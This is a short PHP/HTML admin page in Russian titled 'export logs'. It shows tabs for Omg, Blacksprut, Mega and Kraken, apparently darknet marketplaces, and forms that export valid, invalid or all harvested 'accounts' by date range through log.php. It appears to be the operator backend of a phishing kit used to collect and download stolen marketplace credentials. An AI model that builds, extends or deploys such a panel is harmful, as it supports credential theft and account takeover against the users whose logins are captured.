<?php 
if ($user_info['status'] != 1) exit("Нет доступа");
?>
<h2>Экспорт логов</h2>

<div class="tablist">
<?php 
if (isset($perm_conf['omg'])) echo '<a href="javascript:;">Omg</a>';
if (isset($perm_conf['blacksprut'])) echo '<a href="javascript:;">Blacksprut</a>';
if (isset($perm_conf['mega'])) echo '<a href="javascript:;">Mega</a>';
if (isset($perm_conf['kraken'])) echo '<a href="javascript:;">Kraken</a>';
?>
</div>



<div class="tabcontent">
<?php 
foreach ($perm_conf as $key => $value) {
?>


<form action="log.php" method="get" data-type="application/octet-stream">
	<input type="hidden" name="site-name" value="<?= $key; ?>">
	<div class="dateblock">
		<input type="date" name="date">
		<input type="date" name="date-od">				   
	</div>

	<div class="form-checkbox"> 
	  <label>
	  	<p>Экспортировать не валидные аккаунты</p>
	    <input type="checkbox" name="dublicat-acc" checked="">
	    <span></span>
	  </label>
	</div>
<?php 
if ($user_info['status'] == 1) {
?>
	<div class="form-checkbox"> 
	  <label>
	  	<p>Экспортировать все аккаунты</p>
	    <input type="checkbox" name="checked">
	    <span></span>
	  </label>
	</div>
<?php
}
?>
	<div class="form-controll">
		<button type="submit">Экспорт</button>
	</div>

</form>


<?php
}
?>

</div>


<script>
	document.querySelector('.tablist > a').classList.add('active');
	document.querySelector('.tabcontent > form').style.display = 'block';
</script>